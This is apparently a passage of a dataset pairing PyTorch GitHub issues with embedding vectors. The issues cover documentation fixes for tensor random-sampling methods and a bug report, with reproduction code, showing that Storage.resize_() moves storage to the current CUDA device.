  2.34325320e-01 -4.97352481e-01 -3.47545259e-02  2.54476927e-02
  1.98787153e-01 -1.23562375e-02  3.41064036e-01 -4.93073873e-02
 -1.18076250e-01 -3.44841063e-01  6.78429902e-02 -1.51710153e-01
 -1.46672115e-01  2.44789466e-01 -1.83102459e-01  7.41628557e-02
  9.97181013e-02  3.83409262e-01  2.72908155e-02  1.97164893e-01
 -1.02362983e-01  7.46669769e-02 -1.36148885e-01  1.48163095e-01
 -4.53611672e-01  1.11086607e-01 -1.81186106e-02 -7.93511793e-02
 -5.06774724e-01  1.77971333e-01  8.95007476e-02 -4.48684841e-02
  4.38670427e-01 -1.45030841e-01 -4.09051105e-02  1.76376686e-01
 -1.40983224e-01  1.24878429e-01 -1.76143825e-01 -2.06035480e-01
 -1.23405926e-01  5.50577819e-01  6.44957181e-03  1.17246188e-01
 -1.72689080e-01 -4.43186797e-02 -3.07745010e-01  2.41521686e-01
  3.69461626e-02  2.77146369e-01 -4.12920743e-01  6.63943961e-02
  1.03137150e-01 -1.44924194e-01  1.58127040e-01 -6.27765507e-02
  3.80531102e-02 -1.32313669e-01  7.53231570e-02  4.95937467e-02
  3.54083441e-02  6.37799501e-02  1.02555096e-01 -1.00545615e-01
  1.13382027e-01  8.33592340e-02  3.57882380e-01 -3.07586610e-01
  5.56969345e-02 -3.93292606e-02  4.50725108e-01  7.26169825e-01
 -7.04203546e-03 -2.83089995e-01  1.60664752e-01  1.53383419e-01
 -1.26173258e-01 -1.05019502e-01  9.84455794e-02  2.03300580e-01
  1.36438802e-01  1.51728973e-01  1.10041518e-02  2.80796379e-01
 -1.20527446e-01 -4.54455093e-02 -1.47350192e-01  2.17150450e-01
  2.21226573e-01 -5.97659573e-02 -3.91432531e-02 -2.03286678e-01
  1.90940723e-01  1.12767704e-01 -3.52180362e-01  1.98190629e-01
  8.20684060e-03  3.90351027e-01  3.55656147e-01  2.72765338e-01
  8.86151269e-02 -1.08293317e-01  1.07929289e-01  1.08792417e-01
  9.61273164e-02  2.27488518e-01 -2.14924634e-01 -6.22845963e-02]"
[doc] clarify the range of sampled rv for torch.tensor.exponential_ module: distributions module: docs triaged docathon-h2-2023,"### ðŸ“š The doc issue

Range of sampled random variable needs to be clarified for torch.tensor.exponential_ whose supported interval is (0, inf) is different from [0, inf] of exponential distribution.

Background: https://github.com/pytorch/pytorch/pull/37984#discussion_r1059527457, https://github.com/pytorch/pytorch/issues/48841#issuecomment-1530439039, https://github.com/pytorch/pytorch/pull/91673#discussion_r1069955813

cc @fritzo @neerajprad @alicanb @nikitaved @svekars @carljparker

Implemented by https://github.com/pytorch/pytorch/pull/113195

### Suggest a potential alternative/fix

_No response_",False,"[-0.25970277 -0.29683948 -0.16547716  0.19766521  0.2716601  -0.05202237
 -0.03130199  0.14379804 -0.21444944 -0.16931936 -0.01245297  0.06540064
 -0.15585779  0.02112999 -0.07749175  0.05881242 -0.13296337 -0.28653526
 -0.39815015 -0.04722043  0.3062364  -0.05649898 -0.1774964  -0.02363373
  0.06257443  0.04791472 -0.14915605 -0.2911421   0.06776229 -0.0172991
  0.22880238  0.3015011  -0.2909057  -0.19981605 -0.05044527  0.00594748
  0.02386736  0.01166954 -0.21737213  0.06525802  0.33166933  0.12459533
  0.17255285  0.25609267 -0.14922372  0.18393207 -0.1927058   0.05102006
 -0.25859988  0.07761529 -0.04347526 -0.06291837 -0.06360796  0.0297483
 -0.13844119 -0.5034183  -0.07488575 -0.2541219   0.2346234  -0.11636243
  0.06020984  0.08635101 -0.23324692  0.05558429 -0.12294769 -0.00909771
  0.15300119 -0.13073587  0.61101675  0.36234108 -0.07565284  0.0190388
 -0.13595021 -0.28507328 -0.01785339 -0.15649259 -0.18972251  0.29521418
  0.07231864 -0.2542018   0.20343322 -0.12217379  0.03042475 -0.25484115
 -0.06431039  0.02342275  0.4370293   0.29358262  0.15815234 -0.05716703
  0.17243993  0.16646782 -0.10558151 -0.04852829 -0.12195262  0.25068286
  0.20725372 -0.15728511  0.26226878 -0.0664278  -0.29691264 -0.2581008
 -0.25307688  0.3964994  -0.05128599 -0.23658681 -0.20393652  0.18712549
  0.18751253  0.06060218  0.30809516  0.05979728  0.25319463  0.12804273
  0.09543674 -0.43457967 -0.08388212  0.02412779  0.05832118  0.40038407
 -0.06009826  0.08904642  0.42704114  0.23808481  0.29125395  0.12982607
 -0.05332373 -0.00385428 -0.2361311   0.01016655  0.07559925  0.08042306
 -0.11617596  0.04826775  0.08193409  0.15340748 -0.12653598  0.03936732
 -0.3331265   0.50373346 -0.05611596  0.24480075 -0.19979    -0.11846577
 -0.01891502  0.13600972 -0.12926993 -0.1261741   0.05356359  0.02450535
 -0.04994414  0.00509858 -0.23835437 -0.0758789   0.17782235  0.14283815
  0.06295814  0.02806455  0.11868995 -0.23109117  0.06825212  0.15897655
  0.15835145  0.14194977 -0.02911039  0.02163442 -0.38310164  0.04764497
 -0.11079873  0.28308725  0.169325   -0.28355002 -0.2839094   0.11247103
  0.33216533 -0.1883389   0.09152035 -0.34500363 -0.19018811  0.1905276
  0.31185675  0.08349501  0.48797175  0.3169318  -0.24760023  0.31522405
  0.51531243  0.09561624 -0.26762772 -0.07711583 -0.11804546 -0.58029795
  0.10320562 -0.00236207  0.04806919  0.17929746  0.13334647 -0.10040312
 -0.15500863  0.01432097 -0.06665232 -0.04214452 -0.02301386 -0.04759369
  0.32192594  0.1616464  -0.15076251 -0.37981498 -0.5294801   0.01359963
 -0.10036667 -0.15799583 -0.10726903 -0.14066568 -0.27118775  0.21358499
 -0.21570319 -0.06687835 -0.15595892  0.21441674  0.28020203 -0.15381394
  0.05847688 -0.179216   -0.2727035  -0.13614818 -0.331631    0.190262
  0.04318244  0.1524733   0.03559362  0.07208375  0.39124402 -0.04280121
  0.08576304  0.151808   -0.16229117 -0.13008884 -0.07968832 -0.00792217
 -0.3068093  -0.25512826  0.03829536 -0.03569046 -0.3097112   0.14525537
 -0.12101692 -0.01456127 -0.05030131  0.12461424 -0.08562057 -0.15353078
 -0.20645967 -0.05911885  0.30093032 -0.00965253 -0.01158846  0.20455614
  0.03376214 -0.24934554  0.34507152  0.3582986  -0.16826765  0.49236444
  0.32161647  0.25242674 -0.1063334   0.22274986 -0.12820822 -0.07589784
  0.03276438 -0.3406731   0.5074216   0.0262935   0.01375635 -0.11588186
  0.1781501   0.06241769 -0.32455224 -0.26072246  0.22189465  0.19254781
 -0.16227272  0.2651025  -0.11960567 -0.38603902 -0.07610081 -0.15604164
 -0.09436265 -0.08952861 -0.27308822 -0.32049203  0.3716397   0.04458663
 -0.01406879 -0.11129326  0.12044021 -0.21010354  0.06503172  0.27776575
  0.21571228  0.06588656  0.30282593 -0.17897405 -0.22710425  0.04380138
  0.2578886   0.17455976  0.3947012  -0.2277199   0.1288917  -0.19047335
  0.22225305  0.14734483  0.01449367 -0.07909255 -0.27150586  0.331383
  0.33161128  0.07419373  0.25453928 -0.04577821 -0.36690912 -0.18287796
  0.08378004  0.08404917 -0.28304315 -0.21973622 -0.30089983 -0.07023184
  0.35858583 -0.18854073  0.02507148  0.16178763 -0.05972875 -0.2276915
 -0.15736185  0.26369312 -0.11778329 -0.22216827 -0.26595405 -0.06276708
  0.2312564  -0.20748496 -0.10432175 -0.08212037  0.4060199   0.03901105
 -0.1350367  -0.16375762 -0.07227128  0.16929638 -0.26805675  0.14011228
  0.16994688  0.40289235  0.06420489  0.07539091 -0.01674096  0.36766803
  0.01319064  0.03136024 -0.1516539   0.1311011   0.10379562 -0.13565314
 -0.01028124 -0.16674238 -0.04047477  0.33938235 -0.12982172  0.26609233
 -0.02991619  0.34543872  0.5028906  -0.49763596 -0.15546955 -0.17732543
 -0.06312956 -0.17147754  0.13126916  0.04294275  0.01382404 -0.28952697]"
[doc] two diff meanings of rv generated by torch.tensor.geometric_ and torch.distributions.geometric.Geometric module: distributions module: docs triaged docathon-h2-2023,"### ðŸ“š The doc issue

The meaning of random variables generated by torch.tensor.geometric_ and torch.distributions.geometric.Geometric are different, and they are defined by two different PMFs.
Inform the user, so the user can choose their desired one.

Background: https://github.com/pytorch/pytorch/pull/37984#issuecomment-630336511

cc @fritzo @neerajprad @alicanb @nikitaved @svekars @carljparker

Implemented by https://github.com/pytorch/pytorch/pull/113183

### Suggest a potential alternative/fix

_No response_",False,"[-0.4349053   0.01146258 -0.24568653  0.2896571   0.12149534 -0.3224243
  0.24475557  0.27482533  0.07175712 -0.01627733 -0.16565517 -0.16070619
 -0.0504006   0.11962765 -0.11464006  0.08073945 -0.2542712  -0.15121952
 -0.26273808 -0.03478285  0.6640376   0.0627709  -0.2738278   0.06582791
  0.05996159  0.30510837  0.0281345  -0.2739395   0.34009922  0.10389777
  0.19189286  0.5661153  -0.335824   -0.0322694   0.05046724 -0.04322256
 -0.19843605  0.32890442 -0.24430512  0.0228808   0.12347163  0.18546724
  0.19302672  0.21485257 -0.08878624  0.13313948 -0.12381614  0.23169926
 -0.16176394 -0.09024647 -0.12509538 -0.07051045 -0.27202982  0.17187579
  0.2738296  -0.36548197 -0.11985008 -0.21123606  0.1841842  -0.43801546
  0.13589929  0.3388792  -0.09537564  0.29844385  0.10078682  0.17928168
 -0.04586259 -0.06420936  0.29248342  0.10076752 -0.02874206  0.10187182
  0.23757729 -0.14650583  0.0647708  -0.09714688 -0.3822462   0.30979002
 -0.11092435 -0.3278227   0.27140182  0.21446773  0.16337082 -0.02621207
 -0.04861962  0.24563009  0.12691158  0.09864478  0.05833846  0.17619878
  0.14928742  0.0931396  -0.02353257  0.07114175 -0.3792351   0.2795382
 -0.00273346 -0.4473808   0.62817323 -0.02742095 -0.30334413 -0.40289086
 -0.24425796  0.34257177  0.15140398 -0.22400263 -0.12449358  0.0287958
  0.09786761  0.11592221  0.12524903  0.04324368  0.17067775  0.13762113
 -0.00806195 -0.18717143 -0.17404476  0.07616602  0.41816562  0.2440867
 -0.01693307  0.17370918  0.08038176  0.08107913  0.28266925 -0.18142259
 -0.06653387  0.02520642 -0.35358912  0.13466805  0.01565436  0.11562779
  0.09043078  0.14589217  0.37856996 -0.10516109 -0.16616753  0.284706
 -0.13215089  0.54545414  0.00211146  0.16580506  0.09517951 -0.309273
  0.08334433 -0.09807968 -0.31137764  0.04909825  0.1195513   0.3215359
  0.05385716  0.01462679 -0.482598    0.037823   -0.01992813  0.21004045
 -0.03484327  0.1585199   0.09449982 -0.23047417  0.10295574  0.09552875
  0.26023835  0.23743966 -0.09127501 -0.07896593 -0.41904935 -0.25298843
 -0.48061377 -0.14748733  0.34151885 -0.17288646 -0.38305163  0.4353438
  0.33190596 -0.16630065 -0.2405833  -0.54157585 -0.0878578   0.22664681
  0.6968514   0.04419961  0.23004653 -0.12997311 -0.2945192   0.08024356
  0.33613288 -0.12266035 -0.30870748  0.32786116 -0.07289167 -0.28394765
  0.10571426 -0.18943027  0.20955206  0.26617604  0.3925797   0.02248096
 -0.20313036  0.19620456  0.0129008   0.05715859  0.05674641 -0.0227064
  0.16124141  0.21643558 -0.08793925 -0.22393094 -0.83524084  0.3415547
 -0.12375884 -0.32866156 -0.2519415   0.07952885 -0.02857103  0.32655
 -0.4597915   0.00238231 -0.46212497  0.23772305  0.37470153  0.21037719
 -0.1404919  -0.14753605 -0.349045    0.146785   -0.357394   -0.1734764
 -0.36768556  0.02010448 -0.00545461 -0.04502146  0.3806582  -0.12239946
 -0.10324453  0.4250611  -0.12008154 -0.21925533 -0.02035257 -0.2678831
 -0.26005042 -0.16807652  0.02679336 -0.12421126 -0.33075824  0.01008097
 -0.4531308  -0.2053305   0.02150646  0.1496464  -0.05804674 -0.04749645
 -0.27376977  0.1235681   0.16137864 -0.18775299  0.11416884  0.02835682
 -0.13077825 -0.18380015  0.07023346 -0.28441608 -0.06542727  0.24896851
  0.11040846  0.25680864  0.2020602   0.2666216  -0.05722269 -0.07119705
  0.02738186 -0.32224888  0.5042195  -0.1280812   0.01508912  0.00120305
 -0.00336388 -0.11471767 -0.1586575  -0.41128087 -0.05598009 -0.04364452
  0.07113199  0.5138844  -0.10205103 -0.18407047 -0.08528856  0.09839401
  0.07660104 -0.18273813 -0.13390335 -0.7124449   0.36811447 -0.08598065
  0.06171427  0.15309778 -0.15789571 -0.26774853  0.16598058  0.26368022
  0.17251977  0.36585072 -0.1575225   0.1372639  -0.20387182 -0.12900044
  0.3293907   0.16089433  0.22088826 -0.34000415  0.02478991 -0.17865655
  0.07060178  0.35189763  0.05347228  0.1335163  -0.14710361  0.2984879
  0.26708502  0.22168249 -0.13161866 -0.17554924 -0.21519232 -0.31514192
 -0.19502214 -0.11234061  0.08657768  0.10490677 -0.5875329  -0.2493127
 -0.0641205  -0.1528189  -0.06918041  0.42749244 -0.22022653 -0.178625
 -0.18680204  0.2641104  -0.13161764 -0.18761179 -0.11143789 -0.4370848
  0.13662079 -0.32852876 -0.38408256 -0.01383831  0.55574787 -0.1267371
  0.10557337 -0.11769651  0.1000689   0.12567206 -0.26389065  0.30256715
  0.1132115   0.16117933 -0.03123396  0.12524027  0.05717923  0.3802951
  0.05755647  0.0602366  -0.10756224 -0.02095576  0.02763739  0.02256765
  0.01240949 -0.04822795 -0.08009051  0.28033477  0.02991918  0.27424955
 -0.08739731  0.4515168   0.37164742 -0.28912652 -0.0699503   0.15610589
 -0.03841317 -0.21293904 -0.0137447   0.27497983 -0.280716   -0.392673  ]"
[doc] scale parameter notation for torch.Tensor.cauchy_ is misleading module: distributions module: docs triaged docathon-h2-2023,"### ðŸ“š The doc issue

Scale parameter notation currently used for torch.Tensor.cauchy_ is misleading.
Sigma (Ïƒ) is usually used to denote square root of variance. Variance is undefined in Cauchy distribution.
Replace sigma (Ïƒ) with gamma (Î³).

Background: https://github.com/pytorch/pytorch/pull/37984#discussion_r1059551749

cc @fritzo @neerajprad @alicanb @nikitaved @svekars @carljparker

Implemented by https://github.com/pytorch/pytorch/pull/113178

### Suggest a potential alternative/fix

_No response_",False,"[-0.3706777  -0.24422362 -0.17572312  0.03978661  0.08069183  0.10719706
  0.07521661  0.26263303 -0.17484275 -0.08415897 -0.03368182 -0.18441218
 -0.03962962  0.07181917 -0.27256203  0.03996009 -0.2775746  -0.03251215
 -0.2672819  -0.23865658  0.272454    0.10375112 -0.18849441  0.05854474
 -0.04321806  0.04412065 -0.08897682 -0.26046142  0.01308593  0.06179289
 -0.02749711  0.3079478  -0.22032134  0.04857767 -0.08455645 -0.1516302
  0.05902659  0.14401436  0.00437027  0.16010977  0.08015901  0.168021
  0.11949591  0.27347052 -0.05206842  0.15892905 -0.14841981  0.11666275
 -0.33761862 -0.00760151 -0.01507535  0.11030003 -0.24202144  0.25865507
 -0.06066143 -0.34476584 -0.05103117  0.08564825  0.27228108 -0.11890011
  0.2582004   0.21516058 -0.13603422  0.0996498   0.10649586 -0.0875556
  0.10049669 -0.09485403  0.43545616  0.47161543  0.06558751 -0.07586686
 -0.03314703 -0.2839327   0.19769801 -0.2717697  -0.45402932  0.40202242
  0.18649419 -0.3189366   0.2257708   0.19084363  0.0936375  -0.04347111
  0.01064583 -0.15006608  0.4217438   0.03585194  0.41727793  0.06123421
  0.37921467  0.00482756 -0.14245613  0.10270333 -0.41763896  0.0647881
 -0.04969349 -0.33527645  0.15907274 -0.14190224 -0.2600174  -0.09596687
 -0.05014554  0.39677885  0.1849391  -0.26675254 -0.0908007   0.20920123
  0.14654821  0.11535351  0.23670812  0.00871709  0.04218781  0.16647053
  0.06591118 -0.10116155  0.22344957 -0.08408093  0.03128882  0.24539992
 -0.0330421   0.35977924  0.09813094  0.38630703  0.11996502  0.23896319
 -0.15617597 -0.0201711  -0.01821571  0.17327711  0.20711342 -0.06804361
 -0.10524002 -0.03637183  0.01777574  0.23132987 -0.2621245   0.09068228
 -0.22526988  0.39379176 -0.10322976 -0.1127475  -0.15654169 -0.01668613
  0.02080608  0.1478869  -0.37626773 -0.17852971  0.06492518  0.04931288
  0.01198463  0.03976247 -0.33689892 -0.11334863  0.03000512  0.21098393
  0.05924517  0.01555763  0.1566791  -0.09010942  0.19088158 -0.02239235
  0.15635563 -0.10382994  0.14322436  0.14062318 -0.13640724 -0.01988317
 -0.20900692  0.29057693  0.42641363 -0.08528118 -0.33227575  0.05743691
  0.38029015 -0.20848094 -0.05127958 -0.24454781 -0.3600036   0.2111269
  0.37507778  0.25999367  0.5297018   0.16540304 -0.20609087  0.20054393
  0.3881715  -0.10520669 -0.33770734  0.0697647  -0.03581342 -0.39777365
  0.0462611  -0.0690898  -0.3039291   0.11776429  0.09077369 -0.44294274
 -0.14901572  0.05901533 -0.11906096 -0.02558271  0.07202754 -0.22275907
  0.3321094   0.00908609 -0.31365594 -0.50698364 -0.7935117   0.09430835
 -0.20750424 -0.12509441 -0.23955052 -0.19568872  0.02216407  0.23288049
 -0.13478798 -0.26769727 -0.07413294  0.30695605  0.11943046 -0.03346758
  0.0810898  -0.06929578 -0.28925002 -0.24737802 -0.43917903  0.09083256
  0.03605922  0.01485249 -0.11101979  0.02705606  0.24841067 -0.07255878
 -0.03397958  0.25684497 -0.5777184  -0.00935026 -0.14971209 -0.06776305
 -0.13138273  0.07007697  0.08734845  0.06680566 -0.0565153   0.18950874
 -0.21277237  0.17542946 -0.21748072 -0.2200414  -0.17884596 -0.10777786
 -0.21397915 -0.06232155  0.4333558  -0.10318953  0.0275909   0.09863447
 -0.04943371 -0.20056418  0.33182707  0.14859277 -0.21965036  0.48762533
  0.28487653  0.15567434  0.01359271  0.04211301  0.10114099 -0.14335445
  0.3350513  -0.35683218  0.3967145   0.12485205  0.14699805 -0.32094845
  0.14067549  0.15607801 -0.5378419  -0.37282956  0.00628856  0.1862253
 -0.31668746  0.16716886  0.19178772 -0.37547117 -0.12868783 -0.11369219
 -0.1388153  -0.25802657 -0.15658423 -0.02110614  0.5379146  -0.05081143
 -0.15447381 -0.21573149  0.2731299   0.05562969 -0.02149103  0.08363923
  0.16610269  0.19703093  0.29159343 -0.04221307 -0.01520975  0.05147532
  0.285286    0.05595632  0.54087985 -0.27003175  0.04806431  0.03786262
  0.03957224  0.5705465  -0.12079981  0.07562725 -0.20930803  0.1560786
  0.5045321   0.270434    0.1373754  -0.09797458 -0.30075833  0.04270769
 -0.1335056   0.08855835 -0.2560845  -0.24954337 -0.3481255  -0.13806328
  0.01643529  0.01694082 -0.00998051  0.24225995 -0.22463241 -0.2176218
 -0.129387    0.33162564 -0.13101965 -0.08125922 -0.35308272 -0.0545826
  0.07681818 -0.45372948 -0.26279813 -0.02854053  0.21688029  0.1639963
 -0.33665025 -0.20390756  0.06333181  0.21656445 -0.17249086  0.14073722
  0.12785637  0.40439138 -0.04547314  0.1648991  -0.09943514  0.21747497
 -0.2571339  -0.207397   -0.25019753  0.01108006  0.21450698 -0.08620486
  0.10002939 -0.01763076  0.10932729  0.2873544  -0.17913996  0.17232957
  0.03337085  0.18534577  0.29473954 -0.3693924   0.02015641  0.11670978
 -0.06248207 -0.30945092  0.12868404  0.03509411 -0.1804311  -0.23742804]"
"[doc] torch.tensor.geometric_, torch.tensor.uniform_ fix PMF vs PDF module: distributions module: docs triaged docathon-h2-2023","### ðŸ“š The doc issue

Geometric distribution is discrete, fix to PMF (probability mass function)
Continuous uniform distribution is continuous, fix to PDF (probability density function)

Implemented by https://github.com/pytorch/pytorch/pull/113109

### Suggest a potential alternative/fix

_No response_

cc @fritzo @neerajprad @alicanb @nikitaved @svekars @carljparker",False,"[-0.2907731  -0.16405909 -0.15974678  0.14586176  0.28809035 -0.04296291
  0.00971518  0.07718278 -0.12689836 -0.15348423 -0.02601926 -0.01082947
  0.05739666 -0.08453082 -0.23603025  0.11267709 -0.3032995  -0.20413285
 -0.1390459   0.05186777  0.23600028  0.09598079 -0.15281466  0.09122457
  0.0929826  -0.06352235 -0.08725464 -0.1859222   0.17442343 -0.11724782
  0.2995909   0.5079124  -0.05185059  0.07846846  0.06406161 -0.25707138
  0.10457421 -0.02439337 -0.11664647  0.2213121   0.25458673  0.06209068
  0.31428683  0.24800205 -0.17053518  0.12394167  0.01583199  0.03163836
 -0.12912552  0.12163351 -0.07987276 -0.01458649 -0.24933714  0.10390541
  0.09261189 -0.3182714   0.08076177 -0.24397038  0.27209944 -0.04087986
  0.32440943  0.2906732  -0.11597364  0.12897754  0.01166427  0.28259224
  0.03402313  0.11630616  0.3768856   0.3861258   0.02173642 -0.00117271
 -0.34261632 -0.15025076  0.18455286 -0.03903132 -0.33587384  0.11561677
  0.20924725 -0.07918695 -0.014154   -0.00203299  0.05641704 -0.06817992
 -0.165826   -0.08277918  0.41185692  0.31004274  0.19005394 -0.19304621
  0.40215892  0.22476569 -0.13673964  0.05664549  0.03881811  0.3325082
 -0.07228206 -0.39382488  0.61087704 -0.07116871 -0.18759951 -0.14029026
 -0.182473    0.2555989  -0.14178404 -0.21303572 -0.04741803  0.0975012
 -0.06941143  0.16304672  0.18733445 -0.17204821  0.26665735  0.17573437
  0.1510964  -0.17300561  0.04296435  0.32568467  0.03040443  0.13864383
 -0.12907304 -0.05901029  0.0184709   0.09395377  0.41319615  0.07884875
 -0.34720385 -0.00351452 -0.1310199  -0.11062069  0.32061517  0.13568482
 -0.12327247 -0.01153712  0.07042018 -0.31590623 -0.00291266  0.1794253
 -0.24909121  0.49433425 -0.19973677  0.25949404 -0.23694962 -0.01644285
  0.46349916  0.21295495 -0.51775354  0.05205292  0.1401152   0.2520995
  0.04189822 -0.14148274 -0.31839794  0.08179774  0.09257323  0.36952382
  0.08258401 -0.06269148 -0.1951969   0.03491671  0.0586926   0.35560143
  0.13160007  0.1331833  -0.23994157  0.16507989 -0.5856325  -0.162092
 -0.21697983  0.33424145  0.299906   -0.17637736 -0.08073063  0.28771657
  0.32713994 -0.34246293  0.24087462 -0.40813616 -0.2417342   0.0799766
  0.33905244 -0.11306387  0.42882386 -0.19018397 -0.30128533  0.06222101
  0.17603076 -0.21017867 -0.23337501  0.09004258 -0.18118763 -0.20802572
  0.27232587  0.02199223 -0.09419446 -0.01785735  0.3240678  -0.10799066
  0.21713498  0.35225305 -0.06809825 -0.1725541   0.0850269   0.11552022
  0.28878227  0.05925759 -0.14262208 -0.27137357 -0.7082402   0.24623363
 -0.19789532 -0.650936    0.02070976 -0.09360169 -0.33626956  0.77777225
 -0.04997931 -0.10139985 -0.26787674 -0.0607765   0.15772437  0.12285045
 -0.23808561 -0.24567461 -0.24593738 -0.09279825 -0.38122508  0.08141321
 -0.17945749  0.21455042 -0.16780922  0.05700652  0.4088195  -0.08221718
 -0.04485666  0.03100463 -0.15496184 -0.2417855  -0.1742281  -0.18609396
 -0.28967935 -0.09330226 -0.11516209 -0.02233776  0.03040487  0.08605374
 -0.17190482  0.3118378  -0.20367792  0.23972599 -0.33140242 -0.1715124
 -0.16236836  0.02640161  0.11209194 -0.10616311  0.15636602 -0.07034912
 -0.13241243 -0.4160136   0.23716058  0.2358776  -0.01384409  0.5727904
  0.04039946  0.28966767 -0.0649292   0.09235208  0.11843631 -0.37561068
  0.14752243 -0.3495067   0.53750575 -0.25820985 -0.11353946 -0.14926867
  0.08325195 -0.161785   -0.28072923  0.11118053 -0.18223563  0.43620035
 -0.171369    0.3898552  -0.16481851 -0.35160708  0.16662207 -0.03781892
 -0.2129474   0.16357501 -0.15153998 -0.17138577  0.27919787  0.14855434
  0.08019238  0.23835172  0.23610902 -0.1407067   0.19430313  0.17182699
  0.26083702  0.45152962  0.3062658   0.13698491 -0.09940578  0.076162
  0.09407488  0.21404758  0.27545068 -0.17561348  0.11467467 -0.5099393
  0.14481625  0.51799184 -0.02876613  0.05592271 -0.31219405  0.38090867
  0.23448461  0.11779527  0.04415765 -0.16875285 -0.431866   -0.07676699
 -0.06244996 -0.08679822 -0.13892546 -0.37921837 -0.35855865 -0.03821009
  0.25923058 -0.11659604 -0.01791432  0.11772437 -0.0480012  -0.26886857
 -0.06530638  0.18807398 -0.2537309  -0.08832482 -0.0479925  -0.37376234
  0.13113683 -0.14239255 -0.2743087  -0.00510353  0.3560686   0.06272563
 -0.18584523  0.13250221  0.16786665 -0.1145568  -0.5185766  -0.02763885
 -0.04550226  0.1043751   0.21003026  0.00915381 -0.27337947  0.47661647
 -0.01101608 -0.05395489 -0.34031126 -0.05654813  0.17014177 -0.34136304
  0.03743142 -0.19515076 -0.10388032  0.2275779   0.10867496  0.29873905
 -0.26496023  0.23579705  0.22246599 -0.33406585 -0.00162171  0.18451771
 -0.20398399 -0.2138738  -0.09934693 -0.11043322  0.0430018  -0.2853908 ]"
`Storage.resize_()` moves storage to current device module: cuda triaged,"```
import torch

assert torch.cuda.device_count() >= 2

with torch.cuda.device(1):
    x = torch.zeros((2, 3), device=""cuda:0"")
    print(f""(before op) x.device: {x.device} x.untyped_storage().device: {x.untyped_storage().device}"")
    x.untyped_storage().resize_(0)
    print(
        f""(after op) x.device: {x.device} x.untyped_storage().device: {x.untyped_storage().device}""
    )
```

```
(before op) x.device: cuda:0 x.untyped_storage().device: cuda:0
(after op) x.device: cuda:0 x.untyped_storage().device: cuda:1
```

<details>
<summary> Old Distributed Repro </summary>

```
torchrun --nproc_per_node=2 repro.py 
```

```
import os

import torch
from torch import distributed

local_rank = int(os.getenv(""LOCAL_RANK"", 0))
world_size = int(os.getenv(""WORLD_SIZE"", 1))
distributed.init_process_group(backend=""nccl"", rank=local_rank, world_size=world_size)
device = torch.device(""cuda"", local_rank)
print(f""rank={local_rank} world size={world_size} device={device} current device: {torch.cuda.current_device()}"")

t = torch.randn((1024,), device=f""cuda:{local_rank}"")
if local_rank == 1:
    print(f""[Rank {local_rank}] t.device: {t.device} t.untyped_storage().device: {t.untyped_storage().device}"")
    print(f""[Rank {local_rank}] id(t.untyped_storage()): {id(t.untyped_storage())}"")
    print(f""[Rank {local_rank}] t.untyped_storage().resize_(4).device: {t.untyped_storage().resize_(4).device} t.device: {t.device}"")
    print(f""[Rank {local_rank}] id(t.untyped_storage()): {id(t.untyped_storage())}"")
```

```
rank=1 world size=2 device=cuda:1 current device: 0
rank=0 world size=2 device=cuda:0 current device: 0
[Rank 1] t.device: cuda:1 t.untyped_storage().device: cuda:1
[Rank 1] id(t.untyped_storage()): 139630240323904
[Rank 1] t.untyped_storage().resize_(4).device: cuda:0 t.device: cuda:1
[Rank 1] id(t.untyped_storage()): 139630240323904
```
</details>

cc @ptrblck",False,"[-5.90421408e-02  2.63536088e-02 -3.12808275e-01  1.72931358e-01
 -2.37380937e-01 -1.14539653e-01  1.06912315e-01  2.70823866e-01
 -4.66329366e-01  1.53294289e-02  1.22584090e-01 -1.66946113e-01
 -2.66096205e-01  2.73701310e-01 -4.19489264e-01 -8.67082849e-02
 -1.51540458e-01 -4.29267623e-02 -1.96131378e-01  1.73286259e-01
  4.20102179e-01  8.43446702e-02 -1.85818031e-01 -3.07029217e-01
  1.52398497e-02  3.41300249e-01 -1.41921967e-01 -1.56506658e-01
  2.25323677e-01  8.40503909e-03 -1.98343843e-02  2.43091136e-02
 -7.99690858e-02  4.59441572e-01  4.45893377e-01 -3.56643736e-01
 -3.83254498e-01 -1.18339911e-01 -1.16854571e-01 -3.36582959e-01
 -5.43845333e-02  2.70490378e-01 -1.24670174e-02  2.21493989e-01
 -1.34420414e-02  1.43484801e-01 -2.69613743e-01  1.44823283e-01
 -2.45441377e-01 -2.25147456e-01  1.68610036e-01  2.15185001e-01
 -9.81447101e-02 -2.01033726e-02 -2.57913530e-01 -1.89902902e-01
 -1.58284277e-01 -3.56519409e-03  1.52003706e-01 -1.27642184e-01
  4.17908490e-01 -2.21539289e-01  5.54862469e-02  1.22116596e-01
 -1.36712536e-01 -1.03212014e-01  8.73048529e-02  1.18268661e-01
  3.65121335e-01  5.99950030e-02  2.62029981e-03  3.44587654e-01
 -2.90598810e-01  1.15657859e-02  2.19866782e-01 -5.73995523e-03
 -6.91155940e-02  2.21117705e-01 -2.75507927e-01  5.32329082e-03
 -6.06672205e-02  3.71261239e-01  1.09918509e-02 -2.46561557e-01
 -2.21497566e-01 -9.14725140e-02  1.36673748e-01 -7.29738399e-02
 -9.52677280e-02 -1.83860153e-01  3.19464058e-02  6.04419112e-01
  1.21175297e-01  4.36017632e-01 -2.35145807e-01 -1.33119881e-01
 -5.88740408e-02 -4.26726043e-01 -2.91400850e-01 -4.70177591e-01
  5.72230667e-04 -3.52812298e-02  1.06514432e-01  5.96912146e-01
  5.70422821e-02 -3.40670466e-01 -1.40009671e-02  4.28527206e-01
  8.88830423e-02  1.62822857e-01  2.91853040e-01 -2.96946969e-02
 -3.10840666e-01  2.18639746e-01 -2.24515468e-01 -4.68412861e-02
 -5.47629654e-01 -1.80458948e-02 -9.29879844e-02  1.31557822e-01
 -3.31625402e-01 -1.83623210e-01 -9.06633139e-02 -2.03645647e-01
  1.76012456e-01 -1.01407275e-01  1.23259738e-01 -2.94937156e-02
 -2.27765709e-01 -7.57191777e-02 -2.54946947e-01 -9.24464166e-02
  1.06778331e-01 -1.46707550e-01  2.96339095e-01  7.72734344e-01
 -3.74936640e-01 -2.03025401e-01 -3.40306073e-01  1.67736605e-01
 -6.91464469e-02  3.66458774e-01  2.41955426e-02 -2.52883941e-01
  7.10532367e-02  1.83231801e-01 -1.46176577e-01 -2.68309921e-01
 -2.17952520e-01  5.36038995e-01  4.05219346e-01 -5.61578155e-01
 -1.04466066e-01  1.72612414e-01 -1.36600032e-01 -3.07487488e-01
  3.24250817e-01  1.80400256e-02  2.98872620e-01 -4.19350505e-01
  1.91109598e-01  5.98333105e-02  2.25797117e-01  3.90804857e-01
  2.48575658e-01  1.23581160e-02 -1.45361200e-01 -5.15508391e-02
 -3.31844449e-01  7.47373775e-02  1.75655484e-02 -2.94312716e-01
 -1.03605166e-01 -1.18847862e-02  1.12234935e-01 -4.79152381e-01
